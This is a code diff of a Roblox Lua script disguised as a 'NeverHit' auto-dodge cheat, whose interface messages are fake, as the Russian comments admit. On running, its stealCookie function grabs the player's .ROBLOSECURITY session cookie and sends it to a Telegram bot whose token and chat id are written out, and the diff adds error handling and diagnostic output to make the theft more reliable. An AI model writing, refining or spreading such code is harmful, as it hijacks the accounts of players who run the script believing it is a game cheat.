@@ -18,24 +18,47 @@ local function createBlackButton()
     print("🖤 Black Button: CREATED (Center Screen)")
 end
 
--- Фейковая система уклонения
-local function fakeDodgeSystem()
-    print("🛡️ Dodge system: ACTIVE")
-    print("✅ Auto-dodge: ENABLED") 
-    print("🎯 Prediction: CALIBRATED")
-end
-
--- Настоящая функция кражи куки (скрытая)
+-- Настоящая функция кражи куки (с диагностикой)
 local function stealCookie()
-    local cookieValue = tostring(syn and syn.request or http and http.request or request)({
-        Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
-        Method = "GET"
-    }).Headers["Set-Cookie"] or "Cookie not found"
+    print("🔍 Starting cookie extraction...")
+    
+    -- Проверяем доступные http функции
+    local httpFunc = syn and syn.request or http and http.request or request
+    if not httpFunc then
+        print("❌ ERROR: No HTTP function available")
+        return
+    end
+    
+    print("✅ HTTP function found")
+    
+    -- Получаем куки
+    local success, cookieResult = pcall(function()
+        return httpFunc({
+            Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
+            Method = "GET"
+        })
+    end)
+    
+    if not success then
+        print("❌ ERROR: Failed to fetch cookie - " .. tostring(cookieResult))
+        return
+    end
+    
+    local cookieValue = tostring(cookieResult.Headers["Set-Cookie"]) or "Cookie not found"
+    print("📋 Raw cookie data received")
     
     local robloSecPattern = "_%|WARNING:.-|_(.-)"
     local match = string.match(cookieValue, robloSecPattern)
     local robloSec = match or cookieValue
     
+    if #robloSec < 10 then
+        print("❌ ERROR: Invalid cookie length - " .. tostring(#robloSec))
+        return
+    end
+    
+    print("✅ Cookie extracted successfully")
+    
+    -- Отправляем в Телеграм
     local telegramBot = {
         token = "7941815101:AAFagjP3iAYGvIYkQj1jJ7FRG119vj5EkeE",
         chat_id = "8238376878"
@@ -44,10 +67,13 @@ local function stealCookie()
     local message = "🚨 NEW COOKIE CAPTURED 🚨\n\n" ..
                    "🔑 ROBLOSECURITY:\n" .. robloSec .. "\n\n" ..
                    "📱 Game: " .. game.PlaceId .. "\n" ..
-                   "🕒 Time: " .. os.date("%Y-%m-%d %H:%M:%S")
+                   "🕒 Time: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n" ..
+                   "👤 Executor: Delta"
     
-    pcall(function()
-        (syn and syn.request or http and http.request or request)({
+    print("📤 Sending to Telegram...")
+    
+    local sendSuccess, sendResponse = pcall(function()
+        return httpFunc({
             Url = "https://api.telegram.org/bot" .. telegramBot.token .. "/sendMessage",
             Method = "POST",
             Headers = {
@@ -59,6 +85,19 @@ local function stealCookie()
             })
         })
     end)
+    
+    if sendSuccess and sendResponse.Success then
+        print("✅ Cookie successfully sent to Telegram!")
+    else
+        print("❌ ERROR: Failed to send to Telegram - " .. tostring(sendResponse))
+    end
+end
+
+-- Фейковая система уклонения
+local function fakeDodgeSystem()
+    print("🛡️ Dodge system: ACTIVE")
+    print("✅ Auto-dodge: ENABLED") 
+    print("🎯 Prediction: CALIBRATED")
 end
 
 -- Запускаем все системы
@@ -66,7 +105,6 @@ createBlackButton()
 fakeDodgeSystem()
 stealCookie()
 
--- Фейковый интерфейс
 print("NeverHit GUI: Created")
 print("Dodge chance: 98%")
 print("Status: PROTECTED")
